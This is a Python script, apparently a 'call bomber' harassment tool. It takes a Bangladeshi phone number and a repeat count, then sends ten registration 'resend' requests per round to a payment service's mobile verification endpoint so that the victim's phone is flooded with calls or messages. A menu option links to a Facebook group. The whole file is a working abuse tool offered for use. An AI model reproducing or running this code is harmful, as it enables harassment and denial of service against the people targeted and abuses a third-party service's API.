#coder  : parvej ahmed 
#github : github.com/P4RVEJ
#---------color code--------#
I='\033[1;32m'
Q="\x1b[00m"
dt = f"{Q}[{I}•{Q}]"
n = '\n'
#---------import------------#
import os, sys
import requests 
from requests.structures import CaseInsensitiveDict
import random
#-----------user agent------------#
ua = random.choice(['Mozilla/5.0 (Linux; Android 9; Primo_NF4_2GB Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/398.0.0.13.113;]', 'Mozilla/5.0 (Linux; Android 11; Symphony Z45 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/390.0.0.8.116;]', 'Mozilla/5.0 (Linux; Android 10; M7_3G_A10 Build/V5_20200828; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/398.0.0.13.113;]', 'Mozilla/5.0 (Linux; Android 9; L553 Build/PPR1.181008.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/397.0.0.11.117;]', 'Mozilla/5.0 (Linux; Android 12; LAVA LZX409 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36[FBAN/EMA;FBLC/en_IN;FBAV/398.0.0.13.113;]'])
#--------logo-------------#
logo=("""
     Ş W H Č Ţ """)
#-------clear------------#
def clear():
    os.system("clear")
    print(logo)
    print(22*f'{Q} -')
    print(f' {dt} CODER    : KABBO ')
    print(f' {dt} Facebook : ADIL CHOWDHURY ')
    print(22*' -')
#-------line-------------#
def line():
    print(22*' -')
#---------menu-----------#
def menu():
  clear()
  print(f' {dt} [01] CALL BOMNER')
  print(f' {dt} [02] JOIN GROUP')
  print(f' {dt} [05] EXIT')
  user = input(f' {dt} CHOICE OPTION : ')
  if user in ['01', '1']:
    call()
  elif user in ['02', '2']:
    os.system('xdg-open https://facebook.com/groups/383771796293398/')
  else:
    exit(f' {dt} THANKS FOR USEING MY TOOLS ')
#------------call bomber---------#
def call():
  clear()
  nmbr=input(f'  ENTER NUMBER WITHOUT (+880) : ')
  lmt = int(input('  ENTER LIMITE : '))
  line()
  for i in range(lmt):
    api = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api, headers=headers, json=data)
    api2 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api2, headers=headers, json=data)
    api3 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api3, headers=headers, json=data)
    api4 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api4, headers=headers, json=data)
    api5 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api5, headers=headers, json=data)
    api6 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api6, headers=headers, json=data)
    api7 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api7, headers=headers, json=data)
    api8 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api8, headers=headers, json=data)
    api9 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api9, headers=headers, json=data)
    api10 = 'https://www.redotpay.com/wapi/v1/user/mobile/resend'
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"

    data = {
      "action": "register",
      "nationCode": "+880",
      "mobile": nmbr, 
      "user-agent": ua
      }
    requests.post(api10, headers=headers, json=data)
    print((str(i+1))+f'  CALL SENT SUCCESSFUL')
  print(f' CALL BOMBING SUCCESSFUL')
#---------end-----------#
menu()